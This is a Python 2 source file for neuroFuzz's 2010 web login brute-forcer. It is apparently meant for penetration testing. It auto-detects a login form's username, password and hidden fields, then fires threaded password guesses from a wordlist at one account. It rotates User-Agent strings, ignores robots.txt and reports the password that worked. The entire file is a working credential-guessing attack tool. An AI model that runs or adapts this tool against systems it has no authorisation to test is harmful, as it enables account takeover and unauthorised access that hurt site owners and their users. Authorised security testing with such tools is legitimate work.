"""
    Author: Andres Andreu
    Company: neuroFuzz, LLC
    Date:   7/21/2010
    Prog written to do brute-force testing against a given target's
    authentication mechanism

    External requirements (not built in to py):
        http://wwwsearch.sourceforge.net/old/mechanize/
        
    MIT-LICENSE
    Copyright (c) 2010 Andres Andreu, neuroFuzz LLC

    Permission is hereby granted, free of charge, to any person obtaining a 
    copy of this software and associated documentation files (the "Software"), 
    to deal in the Software without restriction, including without limitation
    the rights to use, copy, modify, merge, publish, distribute, sublicense, 
    and/or sell copies of the Software, and to permit persons to whom the 
    Software is furnished to do so, subject to the following conditions:

    The above copyright notice and this permission notice shall be included 
    in all copies or substantial portions of the Software.

    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, 
    EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES 
    OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND 
    NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT 
    HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
    WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, 
    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER 
    DEALINGS IN THE SOFTWARE.
    
    If you use this for criminal purposes and get caught you are on
    your own and I am not liable. I wrote this for legit pen testing
    purposes.
    
    Be kewl and give credit where it is due if you use this. Also,
    send me feedback as I don't have the bandwidth to test for every
    condition.
"""
#######################################################################
# libs
import re
import sys
import getopt
import urllib2
import threading
import time
import random
import socket
import mechanize
from copy import copy
#######################################################################
# Funcs

"""

"""
def getInput():
    return raw_input('Please provide your input: ')
# EOF

"""

"""
def usage():
    print "\nModes of operation:"
    print "0 - By Username : the detection of the username (-u) in the returned content"
    print "1 - By Negative URL : if some URL is returned then auth has failed"
    print "2 - By Positive URL : if some URL is returned then auth has succeeded"
    print "3 - By Negative String : if some string is present in the returned data then auth has failed"
    print "4 - By Positive String : if some string is present in the returned data then auth has succeeded"
    print "\nExamples"
    print "Usage: python neurofuzz_brute_force_oneuser.py -l target -u user -f wordlist -m 1"
    print "Usage: python neurofuzz_brute_force_oneuser.py -l target -u user -f wordlist -r -m 2"
    print "Usage: python neurofuzz_brute_force_oneuser.py -l target -u user -f wordlist -v -m 3"
    print "Usage: python neurofuzz_brute_force_oneuser.py -l target -u user -f wordlist -r -v -m 0"
    print
    sys.exit(1)
# EOF

"""

"""
def reloader():
    for word in wordlist:
        words.append(word)
# EOF

"""

"""
def getword():
    lock = threading.Lock()
    lock.acquire()

    if len(words) != 0:
        value = random.sample(words,  1)
        words.remove(value[0])
    else:
        print "Reloading Wordlist\n"
        reloader()
        value = random.sample(words,  1)

    lock.release()
    return value[0].strip()
# EOF

"""
"""
def getFormVals(val):
    #print val
    d = {}
    dd = {}
    # this regex should detect the textcontrol (hopefully username)
    # and passwordcontrol fields of the form to be attacked
    reg = re.compile(r"<(\w*Control)\((\w*)=[\)(\w:\/.)]*[\>\s]", re.MULTILINE)
    matches = [m.groups() for m in reg.finditer(val)]
    for m in matches:
        #print m
        if m[0] == "TextControl":
            d['TextControl'] = m[1]
        if m[0] == "PasswordControl":
            d['PasswordControl'] = m[1]
    # this regex should detect any hidden html fields in the target form
    hiddenreg = re.compile(r"<(HiddenControl)\((\w*)=([\w:\/.]*)", re.MULTILINE)
    matches = [m.groups() for m in hiddenreg.finditer(val)]
    for m in matches:
        dd[m[1]] = m[2]
    # if any hidden fields were detected then
    # populate dictionary d with dd
    if dd:
        d['HiddenControl'] = dd
    # only return the dict if both a textcontrol (for username)
    # and password control has been discovered
    if d:
        if 'PasswordControl' in d and 'TextControl' in d:
            return d
    else:
        return None
#######################################################################
# vars

# booleans
# set True if you want to stagger the threads, use switch -r
randomsleep = False
# set True if you want to see verbose output, use switch -v
verbose = False
hiddenfields = False
byprotectedcontent = False
byusername = False
bynegativeurl = False
bypositiveurl = False
bynegativestr = False
bypositivestr = False
# lists
words = []
detectedforms = []
# simple ones
"""
    the next 2 values need to get appropriate strings
    relevant to the target form, we will auto-detect
    them based on the value from the -l switch
    if you don't know what that means you shouldn't be
    running this prog :-)
"""
formusernamefield = ''
formpasswordfield = ''
possiblemodes = [0,1,2,3,4]
modus = ''
# pool of User-Agent headers to choose from
headers = [ "Mozilla/5.0 (compatible)",
            "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)",
            "Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)",
            "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)",
            "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2) Gecko/20070219 Firefox/2.0.0.2",
            "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.2)",
            "Mozilla/5.0 (compatible; Konqueror/2.2.2; Linux 2.4.14-xfs; X11; i686)",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13",
            "Mozilla/5.0 (iPhone; U; CPU like Mac OS X; en) AppleWebKit/420+ (KHTML, like Gecko) Version/3.0 Mobile/1A543 Safari/419.3",
            "Windows-RSS-Platform/1.0 (MSIE 7.0; Windows NT 5.1)",
            "Windows NT 6.0 (MSIE 7.0)",
            "Windows NT 4.0 (MSIE 5.0)",
            "Opera/7.x (Windows NT 5.1; U) [en]",
            "Opera/6.x (Windows NT 4.0; U) [de]",
            "neuroFuzz testing (compatible)"
            ]
##################################################################################################
# input switches
"""
    -f,-l,-u must be followed by an argument, -r,-v are optional
    So you tell getopt this by putting a colon after the switch in that
    parameter to the getopt function.
    sys.argv[1:] skips the name of our prog which is sys.argv[0],
    so start at index one
"""
try:
    opts, args = getopt.getopt(sys.argv[1:], "m:f:l:u:rv")
except getopt.GetoptError:
    usage()
# populate the appropriate vars
for opt, arg in opts:
    if opt in ("-m"):
        modus = arg
    if opt in ("-l"):
        #number = int(arg)
        loginpage = arg
    if opt in ("-u"):
        user = arg
    if opt in ("-f"):
        filehandle = arg
    if opt in ("-r"):
        randomsleep = True
    if opt in ("-v"):
        verbose = True
##################################################################################################
"""
    make sure we have the key elements of data we
    need to start an attack job
"""
# handle the wordlist
try:
    filehandle = filehandle.strip()
    words = open(filehandle, "r").readlines()
except(IOError):
    print "\nError: Check your wordlist path\n"
    sys.exit(1)
except NameError:
    print "\nError: File Handle not set, you missed a switch\n"
    usage()
wordlist = copy(words)
# handle the user object
try:
    user = user.strip()
    user = user.rstrip()
except NameError:
    print "\nError: Target User not set, you missed a switch\n"
    usage()
# handle the target
try:
    loginpage = loginpage.strip()
except NameError:
    print "\nError: Target not set, you missed a switch\n"
    usage()
# handle the mode
try:
    modus = modus.strip()
    modus = int(modus)
    if modus not in possiblemodes:
        print "\nError: The mode is out of range\n"
        usage()
    if modus is 0:
        byusername = True
    if modus is 1:
        bynegativeurl = True
    if modus is 2:
        bypositiveurl = True
    if modus is 3:
        bynegativestr = True
    if modus is 4:
        bypositivestr = True
except NameError:
    print "\nError: Target not set, you missed a switch\n"
    usage()
except ValueError:
    print "\nError: There is a problem with -m switch value\n"
    usage()
##################################################################################################
# handle the modus operandi
"""
    this is the page that would represent a successful login
    this page should not be accessible to a user has not
    succesfully authenticated in to the app.
    later we search this content for some string displayed.
    this targets apps that diplay some string only for an
    authenticated user
    *** Experimental ***
"""
#byprotectedcontent = False
protectedpage = ""
protectedcontent = ""
protectedcontentreg = re.compile(protectedcontent,re.I+re.MULTILINE)

"""
    this would be the criteria for the detection
    of the username in some returned content
    this targets those apps that display the
    username when a user is successfully
    authenticated, we use the value from the
    -u switch
"""
usersuccessreg = re.compile(user,re.I+re.MULTILINE)

"""
    this would be the criteria for a negative URL
    meaning if this URL is returned then auth has
    failed, an example could be:
    http://app.somesite.com/secure/login.jsp?login_error=1
"""
#negativeurl = "http://apitest.jasperwireless.com/provision/jsp/login.jsp?login_error=1"
if bynegativeurl:
    # get the URL
    print "\nWe need the URL"
    negativeurl = getInput()

"""
    this would be the criteria for a positive URL
    meaning if this URL is returned then auth has
    succeeded, an example could be:
    http://app.somesite.com/provision/secure/userHomepage.do
"""
#positiveurl = "http://apitest.jasperwireless.com/provision/secure/dynHomepage.do"
if bypositiveurl:
    # get the url
    print "\nWe need the URL"
    positiveurl = getInput()

"""
    this would be the criteria for a negative string
    meaning if this string is present in the returned
    data then auth has failed, an example would be:
    "Invalid"
"""
if bynegativestr:
    print "\nWe need the String"
    negativestr = getInput()
    negativestrreg = re.compile(negativestr,re.I+re.MULTILINE)

"""
    this would be the criteria for a positive string
    meaning if this string is present in the returned
    data then auth has succeeded, an example would be:
    "Welcome"
"""
if bypositivestr:
    print "\nWe need the String"
    positivestr = getInput()
    positivestrreg = re.compile(positivestr,re.I+re.MULTILINE)
#######################################################################
# classes
class Worker(threading.Thread):

    def run(self):
        global success
        value = getword()
        try:
            if verbose:
                print "Trying %s" % ("-"*12)
                print "User: %s Password: %s" % (user,value)

            fp = mechanize.Browser()
            # ignore robots
            fp.set_handle_robots(False)
            uaheader = random.sample(headers, 1)[0]
            if verbose:
                print "Using randomly chosen User-agent: %s" % uaheader
            fp.addheaders = [('User-agent', uaheader)]
            fp.open(loginpage)
            fp.select_form(nr=0)
            # view forms if necessary
            #for form in br.forms():
            #    print form
            fp[formusernamefield] = user
            fp[formpasswordfield] = value
            if hiddenfields:
                for k, v in detectedforms[0]['HiddenControl'].items():
                    fp.find_control(k).readonly = False
                    #print "%s = %s" % (k, v)
                    fp[k] = v
            # submit form and deal with the response below
            fp.submit()

            # if the check is based on a negative URL
            if bynegativeurl:
                returl = fp.response().geturl()
                # they dont match
                if negativeurl <> returl:
                    success = value
                    #clean up
                    fp.close()
                    sys.exit(1)
            # if the check is based on a positive URL
            if bypositiveurl:
                returl = fp.response().geturl()
                # they match
                if positiveurl == returl:
                    success = value
                    #clean up
                    fp.close()
                    sys.exit(1)
            # if check is based on a negative string
            if bynegativestr:
                if not negativestrreg.search(str(fp.response().read())):
                    success = value
                    fp.close()
                    sys.exit(1)
            # if check is based on a positive string
            if bypositivestr:
                if positivestrreg.search(str(fp.response().read())):
                    success = value
                    fp.close()
                    sys.exit(1)
            # if check is based on username
            if byusername:
                if usersuccessreg.search(str(fp.response().read())):
                    success = value
                    fp.close()
                    sys.exit(1)
            # if check is based on content from some protected
            # resource
            if byprotectedcontent:
                # get the page within the app that is
                # protected by auth
                fp = mechanize.urlopen(protectedpage)
                if protectedcontentreg.search(str(fp.response().read())):
                    success = value
                    fp.close()
                    sys.exit(1)
            # clean up
            fp.close()
        except(socket.gaierror, urllib2.HTTPError), msg:
            print msg
            pass
# EOC
#######################################################################
# main
print "\n\t   neuroFuzz - Web App Authentication Form BruteForcer"
print "\t--------------------------------------------------\n"
print "[+] Target: %s" % loginpage
print "[+] Target User: %s" % user
print "[+] %d possible passwords loaded" % len(words)
if randomsleep:
    print "[+] Staggering requests based on random time"
print
#######################################################################
print "Attempting to detect form values"
# let's make an attempt at intelligently
# detecting the form field names
try:
    nfp = mechanize.Browser()
    # ignore robots
    nfp.set_handle_robots(False)
    nfp.open(loginpage)

    # iterate over the forms on the target page
    for form in nfp.forms():
        ff = getFormVals(str(form))
        # if getFormVals returns something
        # other than None
        if ff:
            detectedforms.append(ff)
    nfp.close()
except(socket.gaierror, urllib2.HTTPError), msg:
    print msg
    pass

# process form data
if len(detectedforms) < 1:
    print "Sorry no forms detected for attacking, closing ..."
    sys.exit(0)
# optimal
if len(detectedforms) == 1:
    print "One form detected, using it ...\n"
    #print detectedforms
    print "Username field: %s" % detectedforms[0]['TextControl']
    formusernamefield = detectedforms[0]['TextControl']
    print "Password field: %s" % detectedforms[0]['PasswordControl']
    formpasswordfield = detectedforms[0]['PasswordControl']
    if 'HiddenControl' in detectedforms[0]:
        hiddenfields = True
        print "Hidden Fields detected:"
        for k, v in detectedforms[0]['HiddenControl'].items():
            print "\t%s = %s" % (k, v)
    print
    #sys.exit(0)
if len(detectedforms) > 1:
    print "More than one form detected"
    sys.exit(0)
#######################################################################
# kicks this multi-threaded bad boy off now
for i in range(len(words)):
    work = Worker()
    work.start()
    if randomsleep:
        time.sleep(5 * random.random())
    else:
        time.sleep(1)
# let the threads catch their breath :-)
print "\nHang tight while the threads finish up."
time.sleep(3)
# final outputs
try:
    if success:
        print "\n\n[!] Successful Login on: %s" % loginpage
        print "[=] User: %s with Password: %s" % (user,success)
    else:
        print "\n[ :=( ] Couldn't find correct password"
except(NameError):
    print "\n[ :=( ] Couldn't find correct password"
    pass
print "\n[=] Done\n"
